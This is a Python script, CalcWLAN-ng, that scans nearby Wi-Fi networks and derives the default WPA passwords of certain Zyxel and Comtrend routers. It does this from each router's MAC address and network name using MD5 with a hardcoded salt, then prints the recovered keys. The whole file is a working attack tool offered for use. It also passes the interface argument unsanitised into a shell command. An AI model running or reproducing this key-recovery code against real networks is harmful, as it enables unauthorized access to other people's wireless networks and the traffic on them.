#!/usr/bin/python

# CalcWLAN-ng 0.5-python by pof
# Some functions taken from Hugo Chargois iwlistparse.py v.0.1

import os
import sys
import subprocess
import re
import hashlib

print "[] CalcWLAN-ng 0.5-python by pof"

if len(sys.argv) < 2:
	print "Usage: "+sys.argv[0]+" <interface> [-all]"
	print "Example: "+sys.argv[0]+" wlan0"
	sys.exit(1)

if os.getuid() != 0:
	print "You must be root to scan networks."
	sys.exit(1)

def crack_comtrend(mac,ssid):
	head = ssid[len(ssid)-4:len(ssid)].upper()
	bssid=re.sub(":","",mac).upper()
	bssidp=bssid[:8]
	key = hashlib.md5("bcgbghgg"+bssidp+head+bssid).hexdigest().lower()[:20]
	return key

def crack_zyxel(mac,ssid):
	head = ssid[len(ssid)-4:len(ssid)].lower()
	bssidp=re.sub(":","",mac).lower()[:8]
	key = hashlib.md5(bssidp+head).hexdigest().upper()[:20]
	return key

def get_key(cell):
	try:
		ssid = matching_line(cell,"ESSID:")[1:-1]
	except TypeError:
		ssid = "null"
	#match = re.search("(WLAN|JAZZTEL)_....$",ssid)
	#if match:
	mac = matching_line(cell,"Address: ")
	if re.search("^00:1F:A4:",mac):	
		key = crack_zyxel(mac,ssid)
	elif re.search("^(00:1A:2B|00:1D:20|64:68:0C)",mac):
		key = crack_comtrend(mac,ssid)
	else:
		key = "null"

	enc = get_encryption(cell)
	if not re.search("WPA",enc):
		key = "null"

	return key


def get_name(cell):
	try:
		name = matching_line(cell,"ESSID:")[1:-1]
	except TypeError:
		name = "null"
	return name

def get_quality(cell):
	try:
		quality = matching_line(cell,"Quality=").split()[0].split('/')
	except AttributeError:
		quality = "0/70"
	return str(int(round(float(quality[0]) / float(quality[1]) * 100))).rjust(3) + " %"

def get_channel(cell):
	return matching_line(cell,"Channel:")

def get_encryption(cell):
	enc=""
	if matching_line(cell,"Encryption key:") == "off":
		enc="Open"
	else:
		for line in cell:
			matching = match(line,"IE:")
			if matching!=None:
				wpa1=match(matching,"WPA Version ")
				if wpa1!=None:
					if enc != "":
						enc=enc+"+WPA"
					else:
						enc="WPA"
				wpa2=match(matching,"IEEE 802.11i/WPA2 Version ")
				if wpa2!=None:
					if enc != "":
						enc=enc+"+WPA2"
					else:
						enc="WPA2"
		if enc=="":
			enc="WEP"
	return enc

def get_address(cell):
	return matching_line(cell,"Address: ")

# Here's a dictionary of rules that will be applied to the description of each
# cell. The key will be the name of the column in the table. The value is a
# function defined above.

rules={"Name":get_name,
       "Quality":get_quality,
       "Channel":get_channel,
       "Encryption":get_encryption,
       "Address":get_address,
       "Key":get_key,
       }


# Below here goes the boring stuff. You shouldn't have to edit anything below
# this point

def matching_line(lines, keyword):
	"""Returns the first matching line in a list of lines. See match()"""
	for line in lines:
		matching=match(line,keyword)
		if matching!=None:
			return matching
	return None

def match(line,keyword):
	"""If the first part of line (modulo blanks) matches keyword,
	returns the end of that line. Otherwise returns None"""
	line=line.lstrip()
	length=len(keyword)
	if line[:length] == keyword:
		return line[length:]
	else:
		return None

def parse_cell(cell):
	"""Applies the rules to the bunch of text describing a cell and returns the
	corresponding dictionary"""
	parsed_cell={}
	for key in rules:
		rule=rules[key]
		parsed_cell.update({key:rule(cell)})
	return parsed_cell


print "Scanning wifi networks on interface "+sys.argv[1]+", hit ^C to stop"


done=[]
while 1:
	#print ".",
	#sys.stdout.flush()

	proc = subprocess.Popen('iwlist '+sys.argv[1]+' scan 2>/dev/null', shell=True, stdout=subprocess.PIPE)
	stdout_str = proc.communicate()[0]
	stdout_list = stdout_str.split('\n')

    	cells=[[]]
    	parsed_cells=[]

	for line in stdout_list:
		cell_line = match(line,"Cell ")
		if cell_line != None:
			cells.append([])
			line = cell_line[-27:]
			if line not in done:
				done.append(line)
				fer=1
		cells[-1].append(line.rstrip())

	cells=cells[1:]

	for cell in cells:
		parsed_cell = parse_cell(cell)
		bssid = parsed_cell['Address']
		if bssid not in done:
			done.append(bssid)
			if len(sys.argv) > 2:
				#print "\nSSID: "+parsed_cell['Name']+"  \tKEY: "+parsed_cell['Key']
				print parsed_cell
			else:
				if parsed_cell['Key'] != "null":
					#print "\nSSID: "+parsed_cell['Name']+"  \tKEY: "+parsed_cell['Key']
					print parsed_cell
